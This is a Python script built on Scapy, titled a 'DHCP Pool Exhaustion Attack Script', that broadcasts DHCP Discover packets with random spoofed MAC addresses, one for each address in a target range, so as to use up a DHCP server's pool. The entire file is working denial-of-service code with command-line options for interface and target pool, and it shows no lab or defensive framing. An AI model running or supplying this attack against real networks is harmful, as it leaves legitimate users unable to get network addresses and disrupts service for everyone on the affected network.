from scapy.all import *
import time
import ipaddress
import argparse

def dhcp_packet(target_ip):
    # construct DHCP Discover packet
    # 1) Create broadcast Ethernet frame with Random source MAC address
    src_mac = RandMAC()
    eth = Ether(src=src_mac, dst="FF:FF:FF:FF:FF:FF")
    # 2) Create IP packet with empyt source ip and broadcast destiniation IP
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    # 3) Create UDP packet with source port 68 and destination port 67
    udp = UDP(sport=68, dport=67)
    # 4) Create BOOTP packet with random transaction ID and client MAC address with operation code 1 (BOOTREQUEST)
    # The BOOTP packet is used to encapsulate the DHCP options and is required for the DHCP Discover message.
    bootp = BOOTP(op=1, chaddr=src_mac)
    # 5) Create DHCP options with message type set to DHCP Discover and target IP address options set to the target IP address
    dhcp = DHCP(options=[("message-type", "discover"), ("requested_addr", target_ip), "end"])
    # 6) Combine all the layers to create DHCP Packet
    packet = eth / ip / udp / bootp / dhcp

    return packet

if __name__ == "__main__":
    # passing the interfance and the pool throught the command line
    parser = argparse.ArgumentParser(description="DHCP Pool Exhaustion Attack Script")
    parser.add_argument("-i", "--interface", required=True, help="Network Interface to send DHCP packets")
    parser.add_argument("-p", "--pool", required=True, help="Target DHCP Pool in CIDR notation (e.g., 192.168.1.0/24)")
    args = parser.parse_args()
    # Disable Scapy's IP address checking to allow sending packets with spoofed source IP addresses
    conf.checkIPaddr = False
    # Define the target IP address list for dhcp pool depletion attack
    target_ip_range = [str(ip) for ip in ipaddress.IPv4Network(args.pool)]
    # Loop throught the  target ip address range
    for target_ip in target_ip_range:
        # create dhcp disvoer packet
        packet = dhcp_packet(target_ip)
        # send the packet at layer 2
        sendp(packet, iface=args.interface, verbose=True)
        time.sleep(0.5)
        